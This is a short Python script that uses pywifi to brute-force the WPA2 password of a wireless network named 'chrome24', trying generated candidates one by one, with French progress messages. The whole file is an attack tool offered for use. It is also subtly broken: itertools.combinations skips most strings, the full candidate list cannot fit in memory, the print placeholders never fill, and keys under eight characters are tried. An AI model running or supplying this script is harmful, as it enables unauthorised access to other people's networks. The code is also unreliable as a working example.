import pywifi
from pywifi import const
import time
import itertools

def connect(ssid, password):

    wifi = pywifi.PyWiFi()

    iface = wifi.interfaces()[0]

    iface.disconnect()
    
    time.sleep(1)
    
    if iface.status() == const.IFACE_DISCONNECTED:

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.key = password
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        
        iface.connect(tmp_profile)

        time.sleep(5)
        
        if iface.status() == const.IFACE_CONNECTED:

            iface.disconnect()

            return True
        
    return False

def generate():

    passwords = []
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    max_length = 12

    for length in range(1, max_length + 1):

        passwords.extend(["".join(combo) for combo in itertools.combinations(alphabet, length)])

    return passwords

def main():

    ssid = "chrome24"

    passwords = generate()

    for password in passwords:

        print("Essai du mot de passe : {password}")

        if connect(ssid, password):

            print("Connexion réussie avec le mot de passe : {password}")

            break

        else:

            print("Échec de la connexion.")
    else:

        print("Aucun des mots de passe n'a fonctionné.")

if __name__ == "__main__":

    main()
